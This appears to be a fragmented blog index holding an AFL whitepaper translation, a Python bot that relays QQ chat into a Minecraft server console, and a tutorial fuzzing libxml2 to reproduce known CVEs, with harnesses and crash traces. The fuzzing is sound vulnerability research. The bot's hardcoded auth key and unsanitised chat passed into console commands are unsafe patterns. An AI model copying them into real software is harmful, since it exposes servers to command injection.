开启即可。使崩溃不再发生或者执行路径没有显著改变的变异结果会被直接丢弃，而一些产生微妙变化的结果会被留下来指导下一轮变异。 这样做可以非常快的产生相关却不同的语料集，来探索这个崩溃对于出错地址的控制能力，来将越界读慢慢推至边界。” 最后作者举了一个 fuzzing unrtf 的实际例子。 这个方法运用插桩反馈来探索崩溃程序的状态，尝试弄清楚原因模糊的崩溃情况，然后将新发现的输入丢给人类进一步审查。 对于崩溃来说，与通常的队列元素相反，将崩溃的输入进行减枝是毫无意义的。它们被发现之后就会原封不动的保存，以便将它们与父（未崩溃）元素进行对比分析。也就是说，是否用 afl-tmin 去剪枝都行。 ","date":"2022-01-01","objectID":"/2022/01/afl-white-book/:10:0","tags":null,"title":"AFL 白皮书翻译与读书笔记","uri":"/2022/01/afl-white-book/"},{"categories":["General"],"content":"10 复制服务器 The fork server 为了提高效率，afl-fuzz 使用“复制服务器”，使得在 fuzzing 过程中，execve 调用、链接、libc 库初始化等工作都只会做一次，后续只要通过写时复制copy-on-write 机制从停止的进程镜像中复制、clone 即可。实现细节在这里。 “一般的 fuzzing 反复测试的过程中，就是简单地 waitpid() 去等待子进程执行结束，然后看看它是否抛出了 SIGSEGV, SIGABRT 等崩溃信号。这种方法被安全研究员所喜爱，因为它能更直接地测试程序，并且每次重新运行程序看上去十分健壮与安全，不会因为随机的内存错误与 fuzzer 本身的存在产生奇怪的副作用。 然而，他们会发现大多数时间都被花费在等待 execve 执行、链接器和库函数初始化的过程上。我以前也想过自己写一个 EFL loader，并在实时执行程序时使用 mprotect 去暂时锁住 fuzzer 自身的内存区域；第二种方法是执行单个子进程，给内存拍个快照，然后通过 /proc/pid/mem 塞给后续的镜像。但这两种方法信号处理都过于麻烦。 幸运的是，我们最后提出了一个简单得多的方法：向被测试库插入一小段代码，让 execve 执行并跳过链接器，然后停在 main 函数，等待 fuzzer 信号。fuzzer 发出“开始”信号后，它就 fork 出一个和已加载内存完全相同的克隆镜像。多亏了 copy-on-write 技术，上述过程可以快速且健壮地进行。而子进程运行结束后，又会重新返回到原 binary，以此往复。 ” 后续作者提到了具体实现时遇到的困难与解决方法，比如文件描述符的定位与复制等。最后给出了这段代码的缩减版本，并认为努力是值得的。 copy-on-write 是体系结构中很常见的一个概念。现代计算机为了提高效率，多个进程同时请求相同的资源，系统并不会在内存中给它们每人起一份镜像，而让它们共用一份。只有当其中某个进程尝试去修改资源时，才会给它单独复制一份。 fork server 被集成在了插桩过程中，它做的仅仅是在插桩代码执行的第一个函数前停住，并等待 afl-fuzz 发号施令。 它可以带来显著的表现提升，通常会快 1.5 到 2 倍。它还可能做到更多： 在手动模式manual (“deferred”) mode 下使用，跳过用户选择的更大块的初始化代码。它只需要改变一点点目标程序，就能在一些目标程序上取得 10+ 倍的增益。 启动顽固模式persistent mode 后，一个进程会被喂多个输入，大量减少了重复的 fork 调用。这通常需要对目标程序做改变，但可以提高 5+ 倍的表现。 估算实时in-process 任务的收益，同时也能保持 fuzzer 进程与目标进程的良好隔离。 ","date":"2022-01-01","objectID":"/2022/01/afl-white-book/:11:0","tags":null,"title":"AFL 白皮书翻译与读书笔记","uri":"/2022/01/afl-white-book/"},{"categories":["General"],"content":"11 并行处理 Parallelization 并行技术中，需要周期性检查 CPU 其他核心内（或远程机器上）独立运行的实例产生的队列，然后选择性地将这些测试用例拿到这个核心（或本地）上来产生从未见过的路径。 这给 fuzzer 设置带来显著的灵活性，包括以同一数据格式的不同解析器为目标，同步运行实例，这通常会带来协同作用synergistic effects . 对于这部分的更多信息，见 parallel_fuzzing.txt . ","date":"2022-01-01","objectID":"/2022/01/afl-white-book/:12:0","tags":null,"title":"AFL 白皮书翻译与读书笔记","uri":"/2022/01/afl-white-book/"},{"categories":["General"],"content":"12 二进制插桩 Binary-only instrumentation 二进制目标的黑盒插桩借助一个分支版本的 QEMU 的用户态实现。这也允许 AFL 执行跨架构的代码——比如，在 x86 架构上执行 ARM 程序。 QEMU 使用基础块basic blocks 作为翻译单元；插桩也在这基础上实现，用基本和 compile-time hooks 类似的模型： if (block_address \u003e elf_text_start \u0026\u0026 block_address \u003c elf_text_end) { cur_location = (block_address \u003e\u003e 4) ^ (block_address \u003c\u003c 8); shared_mem[cur_location ^ prev_location]++; prev_location = cur_location \u003e\u003e 1; } 第二行的移位-异或运算用来做指令对齐的掩码。 二进制翻译器比如 QEMU, DynamoRIO, PIN 等启动都相当慢；为了弥补这一点，QEMU 模式下的 AFL 也应用了一个 fork server，与编译时插桩的代码作用相同，在程序 _start 处停下并复制来有效减少已经初始化的镜像复制。 首次翻译新基本块也会导致后续的时延。为了缓解这一问题，AFL fork server 添加了一个连接运行中的模拟器与父进程的管道。这个管道用来将模拟器新遇到的块地址告诉父进程，后者将其添加到翻译 cache 中，后续子进程复制时直接从 cache 里拿地址即可。 这两方面优化后 QEMU 模式的 AFL 需要大概花费 2-5 倍的白盒模式开销，而 PIN 需要 100+ 倍。 ","date":"2022-01-01","objectID":"/2022/01/afl-white-book/:13:0","tags":null,"title":"AFL 白皮书翻译与读书笔记","uri":"/2022/01/afl-white-book/"},{"categories":["General"],"content":"13 AFL 分析工具 The afl-analyze tool 文件格式分析器file format analyzer 是以前讨论的最小化算法的简单扩展；这个工具不再是尝试去删去无意义的数据块，而会进行一系列的 walking byte flips 操作，然后给输入文件执行的各个字节做注解与分类。 它的分类策略如下： 无意义数据块No-op blocks 位翻转对控制流没有明显改变。 常见的例子比如注释区域、位图中的像素数据等。 多余内容Superficial content 该内容部分（不是全部）位翻转会带来控制流改变。 例子包括富文本（ XML, RTF） 中的字符串。 重要流Critical stream  一个比特序列中所有比特进行位翻转都会改变以不同但相关的方式控制流。 这可能是一些压缩后的数据、非原子比较语句、魔数等。 疑似长度域Suspected length field 小的、原子整数，不管怎么改变都会对程序流产生一致的变化。 这往往预示着长度检测的错误。 疑似校验和或魔整数域Suspected cksum or magic int 与疑似长度域表现相似的整数，但其数值不太可能是代表长度 预示这是一个校验和或者其他含义的魔数。 疑似校验块Suspected checksummed block  一大块数据，改变其中任何地方都要导致执行路径产生相同的新改变。 很像是在进行解析之前的校验和或是相似的复合检查失效。 魔数域Magic value section 与上述表现相同的 token ，但是并没有发现其他准则 可能就是一个原子比较语句。 完。 ==================================这是分割线===================================== 上述提出的很多问题相信在分析 AFL 源码之后便能迎刃而解。 但翻译时能感受到的最大的问题是： ​ 小到每一句，都有被繁乱的定语、从句遮盖重点的风险。 ​ 大到整个白皮书，可以看出作者大量描述一些思想与实现过程，而某种程度上遮蔽了对结果的阐述。 是重点去详尽叙述 AFL 已应用的算法细节与思想（换句话说，是对源码的一篇技术总结）更有用，还是去回忆并记录 AFL 设计过程中的取舍与估量更有用，不同的人有不同的看法，但作者无疑是选择了后者。所以其实进一步的阅读材料已经很明确了：AFL 源码分析！ Warning\r\r在翻译过程中的意译是不可忽略也无法避免的，如陷入误区请指正。\r\r","date":"2022-01-01","objectID":"/2022/01/afl-white-book/:14:0","tags":null,"title":"AFL 白皮书翻译与读书笔记","uri":"/2022/01/afl-white-book/"},{"categories":["General"],"content":"QQ Minecraft 协同机器人，完 Danger\r\rlog4j2 的洞可以在启动服务器时添加 -Dlog4j2.formatMsgNoLookups=true 选项来缓解。\r\r ==================================这是分割线===================================== 与同学交流时发现 MCDReforged 项目会对 Minecraft 服务器进行封装，并把 IO 的脏活累活封装好。但我在尝试时发现体量较大，耦合性较强，适合长期迭代优化，要满足我的需求是杀鸡用牛刀，遂弃用。 接上文，需求已经很清楚了，这里有两个死循环，一个死循环监听 Mirai ，一个死循环监听 MCServer ，跑两个线程即可。 基础代码如下，其中 MCLoop 和 BotLoop 分别代表这两个死循环，前置知识包括 python 多线程编程（threading） Linux 管道（subprocess） python 异步函数（async，await） from graia.broadcast import Broadcast from graia.application import GraiaMiraiApplication, Session from graia.application.message.chain import MessageChain from graia.application.group import Group, Member from subprocess import Popen, PIPE import select import fcntl, os, time import asyncio import threading import nest_asyncio from graia.application.message.elements.internal import Plain, At from graia.application.friend import Friend class MCBackServer(object): def __init__(self, args, server_env = None): self.process = Popen(args, stdin=PIPE, stdout=PIPE) flags = fcntl.fcntl(self.process.stdout, fcntl.F_GETFL) fcntl.fcntl(self.process.stdout, fcntl.F_SETFL, flags | os.O_NONBLOCK) print(\"[+] MC server start!\") def send(self, data, tail = '\\n'): msg = bytes(data+tail, encoding='utf-8') self.process.stdin.write(msg) self.process.stdin.flush() def recv(self, t=.1, stderr=0): r = '' pr = self.process.stdout if stderr: pr = self.process.stdout while True: if not select.select([pr], [], [], 0)[0]: time.sleep(t) continue r = pr.read() return r.rstrip().replace(b\"[Server thread/INFO]\", b'') return r.rstrip().replace(b\"[Server thread/INFO]\", b'') def recv_once(self): pr = self.process.stdout r = pr.read() if r == None: return b'' else: return r.rstrip().replace(b\"[Server thread/INFO]\", b'') loop = asyncio.get_event_loop() bcc = Broadcast(loop=loop) app = GraiaMiraiApplication( broadcast=bcc, connect_info=Session( host=\"http://localhost:8080\", # 填入 httpapi 服务运行的地址 authKey=\"xdchaseforever\", # 填入 authKey account=dontwannatellyou, # 你的机器人的 qq 号 websocket=True # Graia 已经可以根据所配置的消息接收的方式来保证消息接收部分的正常运作. ) ) targetGroup = None targetMember = None permittedCmd = ['list', 'seed', 'whitelist'] happyEvent = ['achievement'] badEvent = ['swim in lava'] otherEvent = [] ServerArgs = ['bash', '/root/start_mc_server.sh'] mcserver = MCBackServer(ServerArgs) @bcc.receiver(\"FriendMessage\") async def friend_message_listener(app: GraiaMiraiApplication, friend: Friend): await app.sendFriendMessage(friend, MessageChain.create([ Plain(\"施工中...\") ])) @bcc.receiver(\"GroupMessage\") async def test( message: MessageChain, app: GraiaMiraiApplication, group: Group, member: Member, ): global targetGroup, targetMember targetGroup = group if message.asDisplay().startswith(\"!\"): ifPermitted = False msg = message.asDisplay()[1:] # print(\"msg: \" + msg) if msg.startswith('ping'): await app.sendGroupMessage(group, MessageChain.create([ At(member.id), Plain(\" pong! I'm working well~~\") ])) return for i in permittedCmd: if msg.startswith(i): ifPermitted = True break if ifPermitted: mcserver.send(msg) res = mcserver.recv().decode() await app.sendGroupMessage(group, MessageChain.create([ At(member.id), Plain('\\n'+res) ])) else: await app.sendGroupMessage(group, MessageChain.create([ At(member.id), Plain(\"\\nSorry, Command Error! These are all we permitted : \" + ','.join(permittedCmd)) ])) else: mcserver.send(\"say \" + member.name + \"@QQ : \" + message.asDisplay()) # print(b'[+]' + mcserver.recv()) def BotLoop(): app.launch_blocking() def MCLoop(): global loop print(\"[+] We ask every 2 seconds\") while(1): res = mcserver.recv_once().decode() if res != '' and targetGroup != None: res = res.split('\\n') ret2qq = '' for mcmsg in res: if \"Can't keep up\" not in mcmsg: print(\"mcmsg ：\"+mcmsg) for i in happyEvent: if i in mcmsg: ret2qq += \" 【喜报】 \" + mcmsg + '\\n' for i in badEvent: if i in mcmsg: ret2qq += \" 【悲报】 \" + mcmsg + '\\n' for i in otherEvent: if i in mcmsg: ret2qq += mcmsg + '\\n' if 'joined the game' in mcmsg: ret2qq += \" Welcome ~~~ \\n\" els","date":"2021-12-10","objectID":"/2021/12/mcbot3/:0:0","tags":null,"title":"如何为 Minecraft 服务器添加一名播报员（完）","uri":"/2021/12/mcbot3/"},{"categories":["General"],"content":"这几天思索了一下需求，在脑中构思出了重定向IO的具体解决办法。这里采用python的subprocess模块起两个个进程跑这两个后端，通过Linux管道机制来实现两个后端的交互。（每次在外面恰饭都是大鱼大肉，，我想吃青菜啊😭😭） 继前文基础需求 x1do0在QQ中说「balabala」，在MC聊天框中出现 [Server] \u003cx1do0@QQ\u003e : balabala xdchase在MC中说「balabala」，在QQ群中出现 xdchase@MC : balabala 消息流一：从QQ到Minecraft，比较容易 graia 收到QQ信息，送进管道stdin 拿到stdout，graia 发送QQ消息 消息流二：从Minecraft到QQ py保持监听stdout，或者 py 以 2s 频率不断问询stdout，是否有需要播报的消息 有需要播报的消息，py里写处理逻辑，得到指定格式info 用 graia 直接发送 info 到QQ 系统架构图 ","date":"2021-11-21","objectID":"/2021/11/mcbot2/:0:0","tags":null,"title":"如何为 Minecraft 服务器添加一名播报员（二）","uri":"/2021/11/mcbot2/"},{"categories":["General"],"content":"第二（半）天开发进度 管道 用子进程跑minecraft服务器，并将其输出输入全部用管道实现，成了！ class MCBackServer(object): def __init__(self, args, server_env = None): self.process = Popen(args, stdin=PIPE, stdout=PIPE, stderr=PIPE) flags = fcntl.fcntl(self.process.stdout, fcntl.F_GETFL) fcntl.fcntl(self.process.stdout, fcntl.F_SETFL, flags | os.O_NONBLOCK) def send(self, data, tail = '\\n'): msg = bytes(data+tail, encoding='utf-8') self.process.stdin.write(msg) self.process.stdin.flush() def recv(self, t=.1, stderr=0): r = '' pr = self.process.stdout if stderr: pr = self.process.stdout while True: if not select.select([pr], [], [], 0)[0]: time.sleep(t) continue r = pr.read() return r.rstrip() return r.rstrip() MineCraft 后台 \u003c-\u003e Bot.py(graia) \u003c-\u003e Mirai 后台 \u003c-\u003e QQ 消息流一 Minecraft Console命令 help [13:57:52] [Server thread/INFO]: /advancement (grant|revoke) [13:57:52] [Server thread/INFO]: /attribute \u003ctarget\u003e \u003cattribute\u003e (get|base|modifier) [13:57:52] [Server thread/INFO]: /execute (run|if|unless|as|at|store|positioned|rotated|facing|align|anchored|in) [13:57:52] [Server thread/INFO]: /bossbar (add|remove|list|set|get) [13:57:52] [Server thread/INFO]: /clear [\u003ctargets\u003e] [13:57:52] [Server thread/INFO]: /clone \u003cbegin\u003e \u003cend\u003e \u003cdestination\u003e [replace|masked|filtered] [13:57:52] [Server thread/INFO]: /data (merge|get|remove|modify) [13:57:52] [Server thread/INFO]: /datapack (enable|disable|list) [13:57:52] [Server thread/INFO]: /debug (start|stop|function) [13:57:52] [Server thread/INFO]: /defaultgamemode (survival|creative|adventure|spectator) [13:57:52] [Server thread/INFO]: /difficulty [peaceful|easy|normal|hard] [13:57:52] [Server thread/INFO]: /effect (clear|give) [13:57:52] [Server thread/INFO]: /me \u003caction\u003e [13:57:52] [Server thread/INFO]: /enchant \u003ctargets\u003e \u003cenchantment\u003e [\u003clevel\u003e] [13:57:52] [Server thread/INFO]: /experience (add|set|query) [13:57:52] [Server thread/INFO]: /xp -\u003e experience [13:57:52] [Server thread/INFO]: /fill \u003cfrom\u003e \u003cto\u003e \u003cblock\u003e [replace|keep|outline|hollow|destroy] [13:57:52] [Server thread/INFO]: /forceload (add|remove|query) [13:57:52] [Server thread/INFO]: /function \u003cname\u003e [13:57:52] [Server thread/INFO]: /gamemode (survival|creative|adventure|spectator) [13:57:52] [Server thread/INFO]: /gamerule (announceAdvancements|commandBlockOutput|disableElytraMovementCheck|disableRaids|doDaylightCycle|doEntityDrops|doFireTick|doImmediateRespawn|doInsomnia|doLimitedCrafting|doMobLoot|doMobSpawning|doPatrolSpawning|doTileDrops|doTraderSpawning|doWeatherCycle|drowningDamage|fallDamage|fireDamage|forgiveDeadPlayers|freezeDamage|keepInventory|logAdminCommands|maxCommandChainLength|maxEntityCramming|mobGriefing|naturalRegeneration|playersSleepingPercentage|randomTickSpeed|reducedDebugInfo|sendCommandFeedback|showDeathMessages|spawnRadius|spectatorsGenerateChunks|universalAnger) [13:57:52] [Server thread/INFO]: /give \u003ctargets\u003e \u003citem\u003e [\u003ccount\u003e] [13:57:52] [Server thread/INFO]: /help [\u003ccommand\u003e] [13:57:52] [Server thread/INFO]: /item (replace|modify) [13:57:52] [Server thread/INFO]: /kick \u003ctargets\u003e [\u003creason\u003e] [13:57:52] [Server thread/INFO]: /kill [\u003ctargets\u003e] [13:57:52] [Server thread/INFO]: /list [uuids] [13:57:52] [Server thread/INFO]: /locate (pillager_outpost|mineshaft|mansion|jungle_pyramid|desert_pyramid|igloo|ruined_portal|shipwreck|swamp_hut|stronghold|monument|ocean_ruin|fortress|endcity|buried_treasure|village|nether_fossil|bastion_remnant) [13:57:52] [Server thread/INFO]: /locatebiome \u003cbiome\u003e [13:57:52] [Server thread/INFO]: /loot (replace|insert|give|spawn) [13:57:52] [Server thread/INFO]: /msg \u003ctargets\u003e \u003cmessage\u003e [13:57:52] [Server thread/INFO]: /tell -\u003e msg [13:57:52] [Server thread/INFO]: /w -\u003e msg [13:57:52] [Server thread/INFO]: /particle \u003cname\u003e [\u003cpos\u003e] [13:57:52] [Server thread/INFO]: /playsound \u003csound\u003e (master|music|record|weather|block|hostile|neutral|player|ambient|voice) [13:57:52] [Server thread/INFO]: /reload [13:57:52] [Server thread/INFO]: /recipe (give|take) [13:57:52] [Server thread/INFO]: /say \u003cmessage\u003e [13:57:52] [Server thread/INFO]: /sched","date":"2021-11-21","objectID":"/2021/11/mcbot2/:0:1","tags":null,"title":"如何为 Minecraft 服务器添加一名播报员（二）","uri":"/2021/11/mcbot2/"},{"categories":["course"],"content":"This is a white-box fuzzing libxml2 v2.9.2 challenge[1] to reproduce CVE-2015-8317[2] Congrats to QuiHao by the way, a brand new qemu 0day Orzzzz!!! The xmlParseXMLDecl function in parser.c in libxml2 before 2.9.3 allows context-dependent attackers to obtain sensitive information via an (1) unterminated encoding value or (2) incomplete XML declaration in XML data, which triggers an out-of-bounds heap read. ","date":"2021-11-14","objectID":"/2021/11/fuzzing2/:0:0","tags":null,"title":"American Fuzzy Lop tutorial-Challenge #libxml2","uri":"/2021/11/fuzzing2/"},{"categories":["course"],"content":"Environment Setup Download libxml2 @ 726f67e and check the version, build and instrument by running: cd libxml2 CC=afl-clang-fast ./autogen.sh AFL_USE_ASAN=1 make -j 4 Here we go x1do0@x1do0:~/fuzzing/afl-training/challenges/libxml2/libxml2.9.2$ ./testModule Success! ","date":"2021-11-14","objectID":"/2021/11/fuzzing2/:0:1","tags":null,"title":"American Fuzzy Lop tutorial-Challenge #libxml2","uri":"/2021/11/fuzzing2/"},{"categories":["course"],"content":"Find target According to NVD, function /parse.c/xmlParseXMLDecl is to blame. But we cannot simply test this function because this is not the entrance for users. Hint: This functionality is exposed in the parser API, and whilst you could dig through this documentation, the easiest approach is to look at an example. parse1.c (also in the repo under doc/examples/parse1.c) shows two core functions: xmlReadFile followed by xmlFreeDoc. ","date":"2021-11-14","objectID":"/2021/11/fuzzing2/:0:2","tags":null,"title":"American Fuzzy Lop tutorial-Challenge #libxml2","uri":"/2021/11/fuzzing2/"},{"categories":["course"],"content":"Write harness To avoid forking process every time, AFL has a keyword __AFL_LOOP() to largely speed things up. __AFL_LOOP(1000) is a macro that detects if the program is running under AFL. If it is, the loop will run 1000 times and 1000 different inputs will be fed to the library. After that, the process is torn down then restarted by AFL. This ensures we regularly replace the process to avoid memory leaks. But if the program runs on his own (i.e. launched with ./harness_persistent and not AFL) the loop runs only once. This way we can process testcases from the command line without looping a thousand time. This mean we can use gdb or automated tools to inspect the crashes found by the fuzzer using the same binary. Use file-input to fuzz In libxml2, parse1 allow us to parse from a file. parse1.c: Parse an XML file to a tree and free it Demonstrate the use of xmlReadFile() to read an XML file into a tree and xmlFreeDoc() to free the resulting tree Includes: (http://xmlsoft.org/html/libxml-tree.html) (http://xmlsoft.org/html/libxml-parser.html) Uses: line 24: Type xmlDocPtr from tree.h line 26: Function xmlReadFile from parser.h line 31: Function xmlFreeDoc from tree.h line 45: Macro LIBXML_TEST_VERSION from xmlversion.h line 50: Function xmlCleanupParser from parser.h line 54: Function xmlMemoryDump from xmlmemory.h Usage: parse1 test1.xml Author: Daniel Veillard I wrote a simple harness and start to fuzz. #include \u003cstdlib.h\u003e#include \u003cstdio.h\u003e#include \u003cfcntl.h\u003e#include \u003cunistd.h\u003e#include \u003clibxml/tree.h\u003e#include \u003clibxml/parser.h\u003e int main(int argc, char* argv[]) { if(argc==2){ while (__AFL_LOOP(1000)) { xmlDocPtr doc = xmlReadFile(argv[1], NULL, 0); if (doc != NULL) xmlFreeDoc(doc); } xmlCleanupParser(); } else printf(\"Usage: %s filename\\n\", argv[0]); return 1; } compile command line: AFL_USE_ASAN=1 afl-clang-fast ./harness.c -I libxml2.9.2/include libxml2.9.2/.libs/libxml2.a -lz -lm -o fuzzer Startup command line: afl-fuzz -i ./in -o ./out ./fuzzer @@ Use stdin to fuzz Another way, according to the HINTS, is to use parse3 parse3.c: Parse an XML document in memory to a tree and free it Demonstrate the use of xmlReadMemory() to read an XML file into a tree and xmlFreeDoc() to free the resulting tree Includes: (http://xmlsoft.org/html/libxml-tree.html) (http://xmlsoft.org/html/libxml-parser.html) Uses: line 27: Type xmlDocPtr from tree.h line 33: Function xmlReadMemory from parser.h line 38: Function xmlFreeDoc from tree.h line 49: Macro LIBXML_TEST_VERSION from xmlversion.h line 54: Function xmlCleanupParser from parser.h line 58: Function xmlMemoryDump from xmlmemory.h Usage: parse3 Author: Daniel Veillard Check [4] for more information about how to use these functions #include \u003cstdlib.h\u003e#include \u003cstdio.h\u003e#include \u003cfcntl.h\u003e#include \u003cunistd.h\u003e#include \u003clibxml/tree.h\u003e#include \u003clibxml/parser.h\u003e int SIZE = 1000; // fix buf size based on assumptions int main() { char buf[SIZE]; ssize_t length; while (__AFL_LOOP(1000)) { length = read(STDIN_FILENO, buf, SIZE); xmlDocPtr doc = xmlReadMemory(buf, SIZE, NULL, NULL, 0); if( doc!= NULL) xmlFreeDoc(doc); } xmlCleanupParser(); return 1; } Compile command line: AFL_USE_ASAN=1 afl-clang-fast ./harness2.c -I libxml2.9.2/include libxml2.9.2/.libs/libxml2.a -lz -lm -o fuzzer2 Startup command line: afl-fuzz -i ./in -o ./out2 ./fuzzer2 ","date":"2021-11-14","objectID":"/2021/11/fuzzing2/:0:3","tags":null,"title":"American Fuzzy Lop tutorial-Challenge #libxml2","uri":"/2021/11/fuzzing2/"},{"categories":["course"],"content":"Results In merely one hour, our first harness produces 5 unique crashes, which is actually the same one. ASAN reports a heap-buffer-overflow in xmlDictComputeFastQKey /home/x1do0/fuzzing/afl-training/challenges/libxml2/libxml2.9.2/dict.c:489 Check for the source code, we found a reference of array name with unchecked index, causing this OOB. So actually, we found CVE-2015-7497[5] accidentally XD, see patchwork[6] After 2 hours, another unique crash pops out! umm, sounds like this shallow bug hides CVE-2015-8317, according to [7]. Maybe AFL need more time. ","date":"2021-11-14","objectID":"/2021/11/fuzzing2/:0:4","tags":null,"title":"American Fuzzy Lop tutorial-Challenge #libxml2","uri":"/2021/11/fuzzing2/"},{"categories":["course"],"content":"Final Statistic These are the screen shot for two harnesses right before I stopped. Harness 1 has a stability of 91.39% and find more crashes in less time. Harness 2 run for about 1.5 hour but find less crashes with pretty low stability. Also, I found 6 crashes which did not crash at all. x1do0@x1do0:~/fuzzing/afl-training/challenges/libxml2$ cat ./out2/default/crashes/id\\:000000\\,sig\\:06\\,src\\:000803\\,time\\:1266536\\,op\\:havoc\\,rep\\:4 | \u003e ./fuzzer2 Entity: line 1: parser error : Char 0x0 out of allowed range SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSh: ^ namespace error : Failed to parse QName 'SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSjSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSCSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSh:' SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSh: ^ Entity: line 1: parser error : Char 0x0 out of allowed range SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSh: ^ Entity: line 1: parser error : Couldn't find end of Start Tag SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSjSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSCSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSh: line 1 SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSh: And a bug where I did not figure out what happened. AddressSanitizer:DEADLYSIGNAL ================================================================= ==1053695==ERROR: AddressSanitizer: SEGV on unknown address 0x618ffffffef6 (pc 0x5592fbf3a477 bp 0x000000000006 sp 0x7ffd30ec62e0 T0) ==1053695==The signal is caused by a READ memory access. #0 0x5592fbf3a476 in xmlDictComputeFastQKey /home/x1do0/fuzzing/afl-training/challenges/libxml2/libxml2.9.2/dict.c:489 #1 0x5592fbf42942 in xmlDictQLookup /home/x1do0/fuzzing/afl-training/challenges/libxml2/libxml2.9.2/dict.c:1093 #2 0x5592fbf5813f in xmlSAX2StartElementNs /home/x1do0/fuzzing/afl-training/challenges/libxml2/libxml2.9.2/SAX2.c:2238 #3 0x5592fbb9495f in xmlParseStartTag2 /home/x1do0/fuzzing/afl-training/challenges/libxml2/libxml2.9.2/parser.c:9707 #4 0x5592fbbbae5e in xmlParseElement /home/x1do0/fuzzing/afl-training/challenges/libxml2/libxml2.9.2/parser.c:10069 #5 0x5592fbbb763d in xmlParseContent /home/x1do0/fuzzing/afl-training/challenges/libxml2/libxml2.9.2/parser.c:9982 #6 0x5592fbbbb5d9 in xmlParseElement /home/x1do0/fuzzing/afl-training/challenges/libxml2/libxml2.9.2/parser.c:10155 #7 0x5592fbbb763d in xmlParseContent /home/x1do0/fuzzing/afl-training/challenges/libxml2/libxml2.9.2/parser.c:9982 #8 0x5592fbbbb5d9 in xmlParseElement /home/x1do0/fuzzing/afl-training/challenges/libxml2/libxml2.9.2/parser.c:10155 #9 0x5592fbbb763d in xmlParseContent /home/x1do0/fuzzing/afl-training/challenges/libxml2/libxml2.9.2/parser.c:9982 #10 0x5592fbbbb5d9 in xmlParseElement /home/x1do0/fuzzing/afl-training/challenges/libxml2/libxml2.9.2/parser.c:10155 #11 0x5592fbbb763d in xmlParseContent /home/x1do0/fuzzing/afl-training/challenges/libxml2/libxml2.9.2/parser.c:9982 #12 0x5592fbbbb5d9 in xmlParseElement /home/x1do0/fu","date":"2021-11-14","objectID":"/2021/11/fuzzing2/:0:5","tags":null,"title":"American Fuzzy Lop tutorial-Challenge #libxml2","uri":"/2021/11/fuzzing2/"},{"categories":["course"],"content":"References [1] https://github.com/mykter/afl-training/tree/main/challenges/libxml2 [2] https://nvd.nist.gov/vuln/detail/CVE-2015-8317 [3] https://toastedcornflakes.github.io/articles/fuzzing_capstone_with_afl.html [4] http://xmlsoft.org/examples/index.html [5] https://www.cvedetails.com/cve/CVE-2015-7497/ [6] https://github.com/GNOME/libxml2/compare/v2.9.2...CVE-2015-7497 [7] https://github.com/google/fuzzer-test-suite/tree/master/libxml2-v2.9.2 ","date":"2021-11-14","objectID":"/2021/11/fuzzing2/:0:6","tags":null,"title":"American Fuzzy Lop tutorial-Challenge #libxml2","uri":"/2021/11/fuzzing2/"},{"categories":["course"],"content":"After all these frustrations due to the virus, I finally get back on the right track. American fuzzy lop (AFL) is a security-oriented fuzzer that employs a novel type of compile-time instrumentation and genetic algorithms to automatically discover clean, interesting test cases that trigger new internal states in the targeted binary. ","date":"2021-11-13","objectID":"/2021/11/fuzzing1/:0:0","tags":null,"title":"American Fuzzy Lop tutorial-basic","uri":"/2021/11/fuzzing1/"},{"categories":["course"],"content":"Overall This training comes from Github [1] for AFL[2]. According to [3], considering AFL Its Benefits: Supports blackbox and whitebox testing. (with or without source code) Supports expanding to your own implementation needs Uses genetic fuzzing techniques Its Cons: Not multi-threaded Does not offer any ability to fuzz network protocols natively I decide to learn fuzzing, starting from AFL. ","date":"2021-11-13","objectID":"/2021/11/fuzzing1/:0:1","tags":null,"title":"American Fuzzy Lop tutorial-basic","uri":"/2021/11/fuzzing1/"},{"categories":["course"],"content":"QuickStart Install all the dependencies and AFL++ in this section 